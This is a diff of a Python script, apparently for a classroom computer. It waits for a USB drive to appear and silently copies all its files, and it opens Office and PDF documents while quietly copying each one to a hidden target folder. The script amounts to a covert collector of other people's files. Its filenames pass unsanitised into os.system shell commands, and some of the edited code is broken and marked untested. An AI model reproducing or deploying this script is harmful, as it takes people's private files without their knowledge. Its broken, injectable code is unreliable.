@@ -11,27 +11,12 @@ filenum = len(os.listdir())
 
 def execute_with_arg():
     if len(sys.argv) == 2:
-        if sys.argv[-1] == '--upan':
+        if sys.argv[1] == '--upan':
             upan()
             sys.exit()
+        else:
+            openfile(sys.argv[1])
 
-        filename = sys.argv[1]
-        file_suffix = filename.split('.')[-1]
-        if file_suffix in ('doc','docx'):
-            threading.Thread(target=lambda:os.system(f'start winword {filename}')).start()
-            shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
-            sys.exit()
-        elif file_suffix in ('ppt','pptx'):
-            threading.Thread(target=lambda:os.system(f'start powerpnt {filename}')).start()
-            shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
-            sys.exit()
-        elif file_suffix in ('xls','xlsx'):
-            threading.Thread(target=lambda:os.system(f'start excel {filename}')).start()
-            shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
-            sys.exit()
-        elif file_suffix in ('pdf',):
-            threading.Thread(target=lambda:os.system(fr'start C:\Users\SEEWO\AppData\Roaming\secoresdk\360se6\Application\360se {filename}')).start()
-            shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
             sys.exit()
 def is_file_number_change():
     '''检测是否出现新文件
@@ -68,7 +53,7 @@ def upan():
     while not os.path.exists('E:\\'):
         time.sleep(60)
     os.chdir('E:\\')
-    TARGET = TARGET+str(time.time())
+    TARGET = os.path.join(TARGET,str(time.time()))  #!未测试
     os.mkdir(TARGET)
     filelst = os.walk('.')
     for i in filelst:
@@ -78,6 +63,26 @@ def upan():
                 target = os.path.join(TARGET,j)
                 shutil.copy(filename,target)
                 print(f'已复制 {filename} at {time.strftime("%Y.%m.%d %H:%M:%S")}')
+def openfile(filename:str):
+    '''
+'''
+        file_suffix = os.path.splitext[-1][1:]  #!未测试
+        if file_suffix in ('doc','docx'):
+            threading.Thread(target=lambda:os.system(f'start winword {filename}')).start()
+            shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
+            sys.exit()
+        elif file_suffix in ('ppt','pptx'):
+            threading.Thread(target=lambda:os.system(f'start powerpnt {filename}')).start()
+            shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
+            sys.exit()
+        elif file_suffix in ('xls','xlsx'):
+            threading.Thread(target=lambda:os.system(f'start excel {filename}')).start()
+            shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
+            sys.exit()
+        elif file_suffix in ('pdf',):
+            threading.Thread(target=lambda:os.system(fr'start C:\Users\SEEWO\AppData\Roaming\secoresdk\360se6\Application\360se {filename}')).start()
+            shutil.copy(filename,os.path.join(TARGET,filename.split(os.sep)[-1]))
+
 def main():
     execute_with_arg()
     print(f'已于 {time.strftime("%Y.%m.%d %H:%M:%S")} 启动')
